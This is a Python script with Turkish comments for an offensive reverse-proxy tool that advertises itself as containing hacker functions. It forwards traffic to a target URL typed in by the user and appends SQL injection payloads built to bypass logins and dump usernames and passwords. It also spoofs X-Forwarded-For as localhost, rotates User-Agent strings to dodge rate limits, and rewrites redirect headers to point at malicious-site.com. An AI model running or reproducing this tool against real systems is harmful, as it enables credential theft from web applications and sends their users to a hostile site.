import http.server
import socketserver
import requests
from urllib.parse import urlparse
import random
import time

# HTTP Header Manipülasyonu fonksiyonu
def manipulate_headers(headers):
    # Random User-Agent ekleyelim
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
    ]
    headers['User-Agent'] = random.choice(user_agents)
    # Hedef sunucuya yönlendirilen başlıkları değiştirebiliriz
    headers['X-Forwarded-For'] = '127.0.0.1'
    return headers

# Zarar Verici Parametre Ekleme fonksiyonu
def inject_hacking_parameters(url):
    # Zarar verici parametreler ekleme
    malicious_params = [
        "?username=admin&password=' OR '1'='1",
        "?id=1 UNION SELECT null, username, password FROM users --"
    ]
    return url + random.choice(malicious_params)

# Rate Limiting Bypass fonksiyonu
def bypass_rate_limiting():
    time.sleep(random.uniform(0.5, 2))  # Yavaşlatma için rastgele zaman bekleme

# Yanıtları değiştirme fonksiyonu
def manipulate_response(response):
    # Örneğin, Redirect yönlendirmelerini değiştirebiliriz
    if "Location" in response.headers:
        location = response.headers['Location']
        print(f"Redirect found: {location}")
        # Yönlendirmeyi değiştirebiliriz
        new_location = "http://malicious-site.com"
        response.headers['Location'] = new_location
    return response

class ReverseProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.forward_request()

    def do_POST(self):
        self.forward_request()

    def forward_request(self):
        # URL'yi hedef URL ile birleştiriyoruz
        target_url = f"{self.server.target_url}{self.path}"

        # Hedef URL’ye zararlı parametre ekleyelim
        target_url = inject_hacking_parameters(target_url)

        # Başlıkları manipüle edelim
        headers = {key: self.headers[key] for key in self.headers}
        headers = manipulate_headers(headers)

        # Veri al (POST ve GET için)
        if self.command == "POST":
            body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
            response = requests.post(target_url, headers=headers, data=body)
        else:
            response = requests.get(target_url, headers=headers)

        # Rate limiting bypass
        bypass_rate_limiting()

        # Yanıtları manipüle et
        response = manipulate_response(response)

        # Yanıtı istemciye gönder
        self.send_response(response.status_code)
        for header, value in response.headers.items():
            self.send_header(header, value)
        self.end_headers()

        # Yanıt içeriğini gönder
        self.wfile.write(response.content)

# Sunucu ayarları
def start_proxy():
    port = 8080
    print(f"Reverse Proxy is listening on port {port}")
    with socketserver.TCPServer(("", port), ReverseProxyHandler) as httpd:
        # Kullanıcıdan hedef URL'yi alıyoruz
        httpd.target_url = input("\033[91mint4 reverse_proxy[Enter Target URL] > \033[0m")
        httpd.serve_forever()

if __name__ == "__main__":
    modul_adi = "reverse_proxy"
    aciklama = "Geliştirilmiş reverse proxy aracı, hacker işlevleri içerir"
    start_proxy()